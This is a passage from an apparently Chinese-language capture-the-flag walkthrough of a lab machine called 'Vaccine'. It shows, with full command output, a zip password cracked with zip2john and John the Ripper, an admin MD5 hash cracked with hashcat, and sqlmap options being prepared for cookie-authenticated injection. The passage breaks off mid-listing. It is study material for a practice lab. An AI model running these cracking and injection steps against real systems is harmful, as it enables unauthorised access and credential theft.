bytes</span><br><span class="hljs-string">--max-length=N             Request a maximum candidate length in bytes</span><br><span class="hljs-string">--max-candidates=[-]N      Gracefully exit after this many candidates tried.</span><br><span class="hljs-string">                           (if negative, reset count on each crack)</span><br><span class="hljs-string">--max-run-time=[-]N        Gracefully exit after this many seconds (if negative,</span><br><span class="hljs-string">                           reset timer on each crack)</span><br><span class="hljs-string">--mkpc=N                   Request a lower max. keys per crypt</span><br><span class="hljs-string">--no-loader-dupecheck      Disable the dupe checking when loading hashes</span><br><span class="hljs-string">--pot=NAME                 Pot file to use</span><br><span class="hljs-string">--regen-lost-salts=N       Brute force unknown salts (see doc/OPTIONS)</span><br><span class="hljs-string">--reject-printable         Reject printable binaries</span><br><span class="hljs-string">--tune=HOW                 Tuning options (auto/report/N)</span><br><span class="hljs-string">--subformat=FORMAT         Pick a benchmark format for --format=crypt</span><br><span class="hljs-string">--format=[NAME|CLASS][,..] Force hash of type NAME. The supported formats can</span><br><span class="hljs-string">                           be seen with --list=formats and --list=subformats.</span><br><span class="hljs-string">                           See also doc/OPTIONS for more advanced selection of</span><br><span class="hljs-string">                           format(s), including using classes and wildcards.</span><br></code></pre></td></tr></table></figure>
+
+<p>we will have to convert the ZIP into the hash using the <code>zip2john</code> module that comes within John the Ripper：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# zip2john backup.zip &gt; hashes<br>ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a <span class="hljs-built_in">type</span>=8<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">cat</span> hashes<br>backup.zip:$pkzip<span class="hljs-variable">$2</span>*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip<br></code></pre></td></tr></table></figure>
+
+<p>Now, we will type the following command: <code>john -wordlist=/usr/share/wordlists/rockyou.txt hashes</code><br>So it will load the wordlist &amp; it will do a bruteforce attack against the hash stored in file hashes . Once the password is cracked, we will use the –show option to display the cracked password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# john -wordlist=/usr/share/wordlists/rockyou.txt hashes<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>741852963        (backup.zip)     <br>1g 0:00:00:00 DONE (2023-07-24 02:40) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# john --show hashes                                    <br>backup.zip:741852963::backup.zip:style.css, index.php:backup.zip<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 0 left<br></code></pre></td></tr></table></figure>
+
+<p>得到密码：741852963，解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# unzip backup.zip<br>Archive:  backup.zip<br>[backup.zip] index.php password: <br>  inflating: index.php               <br>  inflating: style.css<br></code></pre></td></tr></table></figure>
+
+<p>index.php里是什么：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">cat</span> index.php <br>&lt;!DOCTYPE html&gt;<br>&lt;?php<br>session_start();<br>  <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-string">&quot;true&quot;</span>;<br>      header(<span class="hljs-string">&quot;Location: dashboard.php&quot;</span>);<br>    &#125;<br>  &#125;<br>?&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> &gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;MegaCorp Login&lt;/title&gt;<br>  &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;<br><br>&lt;/head&gt;<br>  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;<br>&lt;body&gt;<br>&lt;!-- partial:index.partial.html --&gt;<br>&lt;body class=<span class="hljs-string">&quot;align&quot;</span>&gt;<br><br>  &lt;div class=<span class="hljs-string">&quot;grid&quot;</span>&gt;<br><br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> class=<span class="hljs-string">&quot;form login&quot;</span>&gt;<br><br>      &lt;div class=<span class="hljs-string">&quot;form__field&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;login__username&quot;</span>&gt;&lt;svg class=<span class="hljs-string">&quot;icon&quot;</span>&gt;&lt;use xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> xlink:href=<span class="hljs-string">&quot;#user&quot;</span>&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span class=<span class="hljs-string">&quot;hidden&quot;</span>&gt;Username&lt;/span&gt;&lt;/label&gt;<br>        &lt;input <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;login__username&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> class=<span class="hljs-string">&quot;form__input&quot;</span> placeholder=<span class="hljs-string">&quot;Username&quot;</span> required&gt;<br>      &lt;/div&gt;<br><br>      &lt;div class=<span class="hljs-string">&quot;form__field&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;login__password&quot;</span>&gt;&lt;svg class=<span class="hljs-string">&quot;icon&quot;</span>&gt;&lt;use xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> xlink:href=<span class="hljs-string">&quot;#lock&quot;</span>&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span class=<span class="hljs-string">&quot;hidden&quot;</span>&gt;Password&lt;/span&gt;&lt;/label&gt;<br>        &lt;input <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;login__password&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;form__input&quot;</span> placeholder=<span class="hljs-string">&quot;Password&quot;</span> required&gt;<br>      &lt;/div&gt;<br><br>      &lt;div class=<span class="hljs-string">&quot;form__field&quot;</span>&gt;<br>        &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Sign In&quot;</span>&gt;<br>      &lt;/div&gt;<br><br>    &lt;/form&gt;<br><br>  &lt;/div&gt;<br><br>  &lt;svg xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> class=<span class="hljs-string">&quot;icons&quot;</span>&gt;&lt;symbol <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;arrow-right&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 1792 1792&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z&quot;</span>/&gt;&lt;/symbol&gt;&lt;symbol <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;lock&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 1792 1792&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z&quot;</span>/&gt;&lt;/symbol&gt;&lt;symbol <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;user&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 1792 1792&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z&quot;</span>/&gt;&lt;/symbol&gt;&lt;/svg&gt;<br><br>&lt;/body&gt;<br>&lt;!-- partial --&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>发现这行：</p>
+<p><code>$_POST[&#39;username&#39;] === &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</code></p>
+<p>username: admin</p>
+<p>password: <code>2cb42f8734ea607eefed3b70af13bbd3</code></p>
+<p>根据php语句，密码是md5加密后的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# hashid 2cb42f8734ea607eefed3b70af13bbd3<br>Analyzing <span class="hljs-string">&#x27;2cb42f8734ea607eefed3b70af13bbd3&#x27;</span><br>[+] MD2 <br>[+] MD5 <br>[+] MD4 <br>[+] Double MD5 <br>[+] LM <br>[+] RIPEMD-128 <br>[+] Haval-128 <br>[+] Tiger-128 <br>[+] Skein-256(128) <br>[+] Skein-512(128) <br>[+] Lotus Notes/Domino 5 <br>[+] Skype <br>[+] Snefru-128 <br>[+] NTLM <br>[+] Domain Cached Credentials <br>[+] Domain Cached Credentials 2 <br>[+] DNSSEC(NSEC3) <br>[+] RAdmin v2.x <br><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;2cb42f8734ea607eefed3b70af13bbd3&#x27;</span> &gt; <span class="hljs-built_in">hash</span>           <br><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# hashcat -a 0 -m 0 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-penryn-Intel(R) Celeron(R) N5095 @ 2.00GHz, 1433/2930 MB (512 MB allocatable), 4MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 0 MB<br><br>Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.98Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.96Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.9Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 2 secs<br><br>2cb42f8734ea607eefed3b70af13bbd3:qwerty789                <br><br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 0 (MD5)<br>Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3<br>Time.Started.....: Mon Jul 24 03:30:25 2023 (0 secs)<br>Time.Estimated...: Mon Jul 24 03:30:25 2023 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:   387.5 kH/s (0.18ms) @ Accel:256 Loops:1 Thr:1 Vec:4<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 100352/14344385 (0.70%)<br>Rejected.........: 0/100352 (0.00%)<br>Restore.Point....: 99328/14344385 (0.69%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: 020180 -&gt; paashaas<br>Hardware.Mon.#1..: Util: 14%<br><br>Started: Mon Jul 24 03:29:30 2023<br>Stopped: Mon Jul 24 03:30:26 2023<br></code></pre></td></tr></table></figure>
+
+<p>得到结果：<code>qwerty789</code></p>
+<p>因为80端口的缘故浏览器登录：</p>
+<p>![Untitled](D:\Study\security\Vaccine cb9391dba556416cae0ccf2691de612f\Untitled.png)</p>
+<p>sqlmap使用，在46课也有详细讲解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# sqlmap -h<br>        ___<br>       __H__                                                                     <br> ___ ___[,]_____ ___ ___  &#123;1.7.2#stable&#125;                                         <br>|_ -| . [<span class="hljs-string">&#x27;]     | .&#x27;</span>| . |                                                        <br>|___|_  [<span class="hljs-string">&#x27;]_|_|_|__,|  _|                                                        </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                     </span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage: python3 sqlmap [options]</span><br><span class="hljs-string"></span><br><span class="hljs-string">Options:</span><br><span class="hljs-string">  -h, --help            Show basic help message and exit</span><br><span class="hljs-string">  -hh                   Show advanced help message and exit</span><br><span class="hljs-string">  --version             Show program&#x27;</span>s version number and <span class="hljs-built_in">exit</span><br>  -v VERBOSE            Verbosity level: 0-6 (default 1)<br><br>  Target:<br>    At least one of these options has to be provided to define the<br>    target(s)<br><br>    -u URL, --url=URL   Target URL (e.g. <span class="hljs-string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)<br>    -g GOOGLEDORK       Process Google dork results as target URLs<br><br>  Request:<br>    These options can be used to specify how to connect to the target URL<br><br>    --data=DATA         Data string to be sent through POST (e.g. <span class="hljs-string">&quot;id=1&quot;</span>)<br>    --cookie=COOKIE     HTTP Cookie header value (e.g. <span class="hljs-string">&quot;PHPSESSID=a8d127e..&quot;</span>)<br>    --random-agent      Use randomly selected HTTP User-Agent header value<br>    --proxy=PROXY       Use a proxy to connect to the target URL<br>    --tor               Use Tor anonymity network<br>    --check-tor         Check to see <span class="hljs-keyword">if</span> Tor is used properly<br><br>  Injection:<br>    These options can be used to specify <span class="hljs-built_in">which</span> parameters to <span class="hljs-built_in">test</span> <span class="hljs-keyword">for</span>,<br>    provide custom injection payloads and optional tampering scripts<br><br>    -p TESTPARAMETER    Testable parameter(s)<br>    --dbms=DBMS         Force back-end DBMS to provided value<br><br>  Detection:<br>    These options can be used to customize the detection phase<br><br>    --level=LEVEL       Level of tests to perform (1-5, default 1)<br>    --risk=RISK         Risk of tests to perform (1-3, default 1)<br><br>  Techniques:<br>    These options can be used to tweak testing of specific SQL injection<br>    techniques<br><br>    --technique=TECH..  SQL injection techniques to use (default <span class="hljs-string">&quot;BEUSTQ&quot;</span>)<br><br>  Enumeration:<br>    These options can be used to enumerate the back-end database<br>    management system information, structure and data contained <span class="hljs-keyword">in</span> the<br>    tables<br><br>    -a, --all           Retrieve everything<br>    -b, --banner        Retrieve DBMS banner<br>    --current-user      Retrieve DBMS current user<br>    --current-db        Retrieve DBMS current database<br>    --passwords         Enumerate DBMS <span class="hljs-built_in">users</span> password hashes<br>    --dbs               Enumerate DBMS databases<br>    --tables            Enumerate DBMS database tables<br>    --columns           Enumerate DBMS database table columns<br>    --schema            Enumerate DBMS schema<br>    --dump              Dump DBMS database table entries<br>    --dump-all          Dump all DBMS databases tables entries<br>    -D DB               DBMS database to enumerate<br>    -T TBL              DBMS database table(s) to enumerate<br>    -C COL              DBMS database table column(s) to enumerate<br><br>  Operating system access:<br>    These options can be used to access the back-end database management<br>    system underlying operating system<br><br>    --os-shell          Prompt <span class="hljs-keyword">for</span> an interactive operating system shell<br>    --os-pwn            Prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br><br>  General:<br>    These options can be used to <span class="hljs-built_in">set</span> some general working parameters<br><br>    --batch             Never ask <span class="hljs-keyword">for</span> user input, use the default behavior<br>    --flush-session     Flush session files <span class="hljs-keyword">for</span> current target<br><br>  Miscellaneous:<br>    These options <span class="hljs-keyword">do</span> not fit into any other category<br><br>    --wizard            Simple wizard interface <span class="hljs-keyword">for</span> beginner <span class="hljs-built_in">users</span><br><br>[!] to see full list of options run with <span class="hljs-string">&#x27;-hh&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>因cookie身份认证问题，</p>
+<p>需下载插件，cookie编辑器：</p>
+<aside>
+🔒 For Google:
+[https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm)
+For Firefox:
+[https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)
+
+</aside>
+
+<p>![Untitled](D:\Study\security\Vaccine cb9391dba556416cae0ccf2691de612f\Untitled 1.png)</p>
+<p>啊反复了几次，这次终于拿到了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 